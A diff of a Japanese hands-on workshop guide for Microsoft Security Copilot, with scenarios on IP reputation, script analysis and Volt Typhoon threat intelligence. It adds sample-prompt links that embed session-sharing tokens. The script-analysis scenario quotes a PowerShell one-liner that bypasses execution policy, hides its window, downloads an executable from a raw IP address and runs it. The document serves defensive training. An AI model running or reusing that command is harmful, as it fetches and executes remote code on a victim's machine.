@@ -24,6 +24,9 @@ VirusTotal を使用して、このIPアドレス 185.220.101.86 のレピュテ
 調査結果をエグゼクティブ・レポートにまとめて
  ```
 
+プロンプト例：このプロンプトはWorkShop参加者の方のみ参照可能です。
+[サンプルプロンプト]()
+
 ***
 &nbsp;
 ## ハンズオンシナリオ➁　スクリプト分析編
@@ -33,6 +36,9 @@ VirusTotal を使用して、このIPアドレス 185.220.101.86 のレピュテ
 Script:powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://185.82.217.3/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'\\invoice.exe'
  ```
 
+プロンプト例：このプロンプトはWorkShop参加者の方のみ参照可能です。
+[サンプルプロンプト](https://securitycopilot.microsoft.com/sessions/7fd4c1dc-ed79-4744-b255-8fae70757085?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiODZlZGIwZDYtYzM1NC00ZjI5LTk5ZTAtZmVmYTg5MzZhZWE3IiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6IjdmZDRjMWRjLWVkNzktNDc0NC1iMjU1LThmYWU3MDc1NzA4NSIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI1Mjg2ODI2LCJleHAiOjIwNDA4MTk2MjYsImlhdCI6MTcyNTI4NjgyNiwiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.LHPhIaJhFDaKt6fYc0648wd6L3i83pE020cmO0QIARg)
+
 ***
 &nbsp;
 ## ハンズオンシナリオ➁　脅威インテリジェンス編
@@ -40,6 +46,9 @@ Script:powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $Error
  ```
 私はセキュリティエンジニアです。攻撃アクターグループ Volt Typhoon について教えて
  ```
+
+プロンプト例：このプロンプトはWorkShop参加者の方のみ参照可能です。
+[サンプルプロンプト](https://securitycopilot.microsoft.com/sessions/d986e587-9322-4a69-ab2c-54aa9082bd98?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiMDA5OTEzMTctOTQzZS00NjkxLWI3OTAtMWRiNTBhODA0YjM4IiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6ImQ5ODZlNTg3LTkzMjItNGE2OS1hYjJjLTU0YWE5MDgyYmQ5OCIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI1Mjg2NzcwLCJleHAiOjIwNDA4MTk1NzAsImlhdCI6MTcyNTI4Njc3MCwiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.2G4R-9SMGjvnS88ar6u9k-6u5kvf98hKvBL6zBiuQg8)
 
 ***
 &nbsp;
